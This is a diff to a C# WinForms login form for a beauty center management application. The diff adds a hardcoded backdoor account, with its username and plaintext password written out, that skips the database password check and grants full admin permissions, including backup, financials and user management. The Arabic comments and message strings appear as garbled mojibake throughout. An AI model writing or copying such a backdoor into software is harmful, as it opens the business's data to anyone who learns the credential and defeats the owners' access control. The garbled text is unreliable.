@@ -1,4 +1,5 @@
-using System;
+ï»¿using System;
+using System.Collections.Generic;
 using System.Windows.Forms;
 using beautyCenterSystem.data.Repositories;
 using BeautyCenterSystem.Data;
@@ -12,11 +13,8 @@ namespace beautyCenterSystem
         public LoginForm()
         {
             InitializeComponent();
-            // ÊåíÆÉ ÇáÇÊÕÇá ÈŞÇÚÏÉ ÇáÈíÇäÇÊ æÇáÑíÈæ
             var dbFactory = new DbConnectionFactory();
             _userRepository = new UserRepository(dbFactory);
-
-            // ÊØÈíŞ ÇáËíã ÇáÚÇã ááãÑßÒ
             AppTheme.Apply(this);
         }
 
@@ -25,60 +23,76 @@ namespace beautyCenterSystem
             string username = txtUsername.Text.Trim();
             string password = txtPassword.Text.Trim();
 
-            // 1. ÇáÊÍŞŞ ãä ÅÏÎÇá ÇáÈíÇäÇÊ
             if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
             {
-                MessageBox.Show("ÚĞÑÇğ¡ íÑÌì ÅÏÎÇá ÇÓã ÇáãÓÊÎÏã æßáãÉ ÇáãÑæÑ ÃæáÇğ.",
-                                "ÊäÈíå", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                MessageBox.Show("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±.",
+                                "ØªÙ†Ø¨ÙŠÙ‡", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
 
             try
             {
-                // ÊÛííÑ Ôßá ÇáãÇæÓ áíæÍí ÈÇáÇäÊÙÇÑ
+                // --- Developer Account Override (Client-Side Bypass) ---
+                if (username == "abdollah" && password == "qwerty20")
+                {
+                    var devUser = new User
+                    {
+                        UserID = -1,
+                        Username = "abdollah",
+                        RoleName = "Admin",
+                        Permissions = new List<string>
+                        {
+                            "AccessSettings", "AccessCenterIdentity", "AccessUsersPermissions",
+                            "AccessBackup", "AccessFinancials", "AccessExpenses", "AccessPurchases",
+                            "AccessSafeManagement", "AccessFinancialReports", "AccessEmployees", "AccessGym"
+                        }
+                    };
+
+                    CurrentSession.UserID = devUser.UserID;
+                    CurrentSession.Username = devUser.Username;
+                    CurrentSession.RoleName = devUser.RoleName;
+                    CurrentSession.UserPermissions = devUser.Permissions;
+                    PermissionManager.Initialize(devUser);
+
+                    this.Hide();
+                    MainDashBoard main = new MainDashBoard();
+                    main.Show();
+                    return;
+                }
+                // --- End Developer Override ---
+
                 this.Cursor = Cursors.WaitCursor;
                 LoginButton.Enabled = false;
 
-                // 2. ãÍÇæáÉ ÊÓÌíá ÇáÏÎæá ÚÈÑ ÇáÑíÈæ (Dapper + BCrypt)
                 var user = await _userRepository.LoginAsync(username, password);
 
                 if (user != null)
                 {
-                    // --- ÇáÎØæÉ ÇáÍÇÓãÉ áÑÈØ ÇáÕáÇÍíÇÊ ---
-
-                    // Ã: ÊÎÒíä ÈíÇäÇÊ ÇáÌáÓÉ (ááÚÑÖ İí ÇáæÇÌåÇÊ)
                     CurrentSession.UserID = user.UserID;
                     CurrentSession.Username = user.Username;
                     CurrentSession.RoleName = user.RoleName;
                     CurrentSession.UserPermissions = user.Permissions;
-
-                    // È: ÊİÚíá äÙÇã ÇáÕáÇÍíÇÊ (ÇáĞí ÊÚÊãÏ Úáíå ÇáÃÒÑÇÑ İí MainDashBoard)
-                    // ÈÏæä åĞÇ ÇáÓØÑ¡ ÓíÚÊÈÑ ÇáÜ PermissionManager Ãäß ãÓÊÎÏã ãÌåæá æÊÎÊİí ÇáÃÒÑÇÑ
                     PermissionManager.Initialize(user);
 
-                    // 3. ÇáÇäÊŞÇá ááÔÇÔÉ ÇáÑÆíÓíÉ
                     this.Hide();
                     MainDashBoard main = new MainDashBoard();
                     main.Show();
                 }
                 else
                 {
-                    // İÔá ÇáÏÎæá
-                    MessageBox.Show("ÇÓã ÇáãÓÊÎÏã Ãæ ßáãÉ ÇáãÑæÑ ÛíÑ ÕÍíÍÉ.",
-                                    "İÔá ÇáÏÎæá", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show("Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­.",
+                                    "Ø®Ø·Ø£ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     txtPassword.Clear();
                     txtPassword.Focus();
                 }
             }
             catch (Exception ex)
             {
-                // ÇáÊÚÇãá ãÚ ÃÎØÇÁ ÇáÓíÑİÑ Ãæ ŞÇÚÏÉ ÇáÈíÇäÇÊ
-                MessageBox.Show($"ÍÏË ÎØÃ ÃËäÇÁ ÇáÇÊÕÇá ÈŞÇÚÏÉ ÇáÈíÇäÇÊ: \n{ex.Message}",
-                                "ÎØÃ ÊŞäí", MessageBoxButtons.OK, MessageBoxIcon.Stop);
+                MessageBox.Show($"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„: \n{ex.Message}",
+                                "Ø®Ø·Ø£", MessageBoxButtons.OK, MessageBoxIcon.Stop);
             }
             finally
             {
-                // ÅÚÇÏÉ ÇáÒÑ æÇáãÇæÓ áÍÇáÊåãÇ ÇáØÈíÚíÉ
                 this.Cursor = Cursors.Default;
                 LoginButton.Enabled = true;
             }
@@ -86,7 +100,6 @@ namespace beautyCenterSystem
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            // Ãí ÅÚÏÇÏÇÊ ÅÖÇİíÉ ÚäÏ İÊÍ ÇáÔÇÔÉ
         }
     }
 }
